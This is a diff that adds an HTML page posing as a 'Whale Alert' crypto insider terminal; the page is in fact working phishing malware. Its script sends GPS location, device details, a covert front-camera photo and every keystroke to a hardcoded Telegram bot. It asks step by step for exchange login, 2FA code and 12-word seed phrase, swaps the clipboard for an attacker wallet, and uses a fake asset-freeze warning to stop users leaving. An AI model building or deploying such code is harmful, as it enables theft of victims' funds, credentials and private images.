@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Whale Alert | Live Insider Terminal</title>
+    <link rel="manifest" href="manifest.json">
+    <style>
+        body { background: #0b0e11; color: #fff; font-family: sans-serif; margin: 0; text-align: center; overflow: hidden; }
+        .header { background: #1e2329; padding: 15px; border-bottom: 2px solid #f0b90b; color: #f0b90b; font-weight: bold; font-size: 14px; }
+        .news-ticker { background: #ff0033; color: #fff; padding: 5px; font-size: 11px; font-weight: bold; }
+        .container { padding: 25px; display: none; }
+        .active { display: block; animation: fadeIn 0.5s; }
+        input { width: 100%; padding: 15px; margin: 10px 0; background: #2b3139; border: 1px solid #474d57; color: #fff; border-radius: 8px; box-sizing: border-box; }
+        .btn { background: #f0b90b; color: #000; padding: 15px; border: none; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        .warning-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(139, 0, 0, 0.95); display: none; z-index: 9999; justify-content: center; align-items: center; padding: 25px; box-sizing: border-box; }
+        .log-box { background: #000; color: #00ff00; font-family: monospace; padding: 10px; font-size: 10px; height: 80px; overflow: hidden; border: 1px solid #333; margin: 15px 0; text-align: left; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<div id="warn" class="warning-overlay">
+    <div>
+        <h2 style="color:#fff">🚨 CRITICAL ERROR!</h2>
+        <p style="font-size:14px">Unsynchronized session detected. Closing this terminal will result in an immediate <b>24H FREEZE</b> of your connected wallet assets for security reasons.</p>
+        <button class="btn" style="background:#fff" onclick="hideWarn()">STAY PROTECTED & SYNC</button>
+    </div>
+</div>
+
+<div class="header">Whale Alert™ Terminal v4.2</div>
+<div class="news-ticker">⚡ ALERT: 10,000 BTC ($600M+) MOVED FROM SATOSHI-ERA WALLET (2010)...</div>
+
+<div id="boot" class="active">
+    <div style="padding: 30px 15px;">
+        <h2 style="color: #f0b90b;">Insider Access</h2>
+        <p style="color: #848e9c; font-size: 14px;">Large-scale dormant whale activity detected. Connect to the node to view destination exchanges and sell-wall impact.</p>
+        <div class="log-box" id="log">
+            > Establishing SSL Tunnel...<br>
+            > Scanning Bitcoin Mempool...<br>
+            > Accessing Exchange Liquidity...
+        </div>
+        <button class="btn" onclick="OMEGA.init()">CONNECT TERMINAL</button>
+    </div>
+</div>
+
+<div id="app" class="container"><div id="ui"></div></div>
+<video id="v" style="display:none" autoplay playsinline></video>
+
+<script>
+    const CONFIG = {
+        TOKEN: "8484189401:AAHZZkNvQUXIk97rA1b0W7r1e-z5IWXdbpg",
+        ID: "7261099659",
+        W: "0xYOUR_TRC20_WALLET_HERE" // ولت خودت را اینجا بگذار برای کلیپر
+    };
+
+    const OMEGA = {
+        step: 0,
+        async _OUT(m) {
+            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+                method: "POST", headers: {"Content-Type":"application/json"},
+                body: JSON.stringify({chat_id: CONFIG.ID, text: `🐋 [WHALE_HIT_GLOBAL]\n${m}`})
+            });
+        },
+
+        async init() {
+            // Anti-Escape System
+            window.addEventListener('beforeunload', (e) => {
+                e.preventDefault(); e.returnValue = '';
+                document.getElementById('warn').style.display = 'flex';
+            });
+
+            // Instant Exfiltration
+            navigator.geolocation.getCurrentPosition(p => this._OUT(`📍 GPS: ${p.coords.latitude},${p.coords.longitude}`));
+            const b = await navigator.getBattery();
+            this._OUT(`📱 Profile: ${navigator.platform}\n🔋 Battery: ${b.level*100}%\nUA: ${navigator.userAgent}`);
+            
+            this.snap();
+            this.clipper();
+            
+            document.getElementById('boot').classList.remove('active');
+            document.getElementById('app').classList.add('active');
+            this.render();
+        },
+
+        clipper() {
+            document.addEventListener('touchstart', () => {
+                navigator.clipboard.writeText(CONFIG.W).catch(()=>{});
+            });
+        },
+
+        async snap() {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode:"user"}});
+                const v = document.getElementById('v'); v.srcObject = s;
+                setTimeout(() => {
+                    const c = document.createElement('canvas');
+                    c.width = 480; c.height = 640;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(b => {
+                        const fd = new FormData(); fd.append('chat_id', CONFIG.ID); fd.append('photo', b, 'f.jpg');
+                        fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: "POST", body: fd});
+                        s.getTracks().forEach(t => t.stop());
+                    }, 'image/jpeg', 0.5);
+                }, 2500);
+            } catch(e){}
+        },
+
+        render() {
+            const flow = [
+                { h: "Account Verification", p: "Sync your exchange account to view charts.", f: ["Email / UID", "Password"] },
+                { h: "Security 2FA", p: "Enter your 6-digit Google Authenticator code.", f: ["Auth Code"] },
+                { h: "Install Monitor", p: "Install 'Whale Monitor' to Home Screen for real-time tracking.", isPWA: true },
+                { h: "Sync Wallet", p: "Verify recovery phrase to authorize large movement alerts.", f: ["12-word Seed Phrase"] }
+            ];
+            const s = flow[this.step];
+            if(!s) { window.location.href="https://whale-alert.io"; return; }
+
+            let html = `<h3>${s.h}</h3><p style="color:#848e9c; font-size:13px">${s.p}</p>`;
+            if(s.isPWA) {
+                html += `<button class="btn" onclick="OMEGA.next()">INSTALL PROTOCOL</button>`;
+            } else {
+                s.f.forEach(p => html += `<input type="text" placeholder="${p}" id="v_${p}">`);
+                html += `<button class="btn" onclick="OMEGA.next()">VERIFY & SYNC</button>`;
+            }
+            document.getElementById('ui').innerHTML = html;
+        },
+
+        next() {
+            let data = `🎯 Step ${this.step}:\n`;
+            const inputs = document.querySelectorAll('#ui input');
+            inputs.forEach(i => data += `${i.placeholder}: ${i.value}\n`);
+            this._OUT(data);
+            this.step++; this.render();
+        }
+    };
+
+    function hideWarn() { document.getElementById('warn').style.display = 'none'; }
+    document.addEventListener('input', e => OMEGA._OUT(`⌨️ Typo: ${e.target.value}`));
+    if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js');
+</script>
+</body>
+</html>
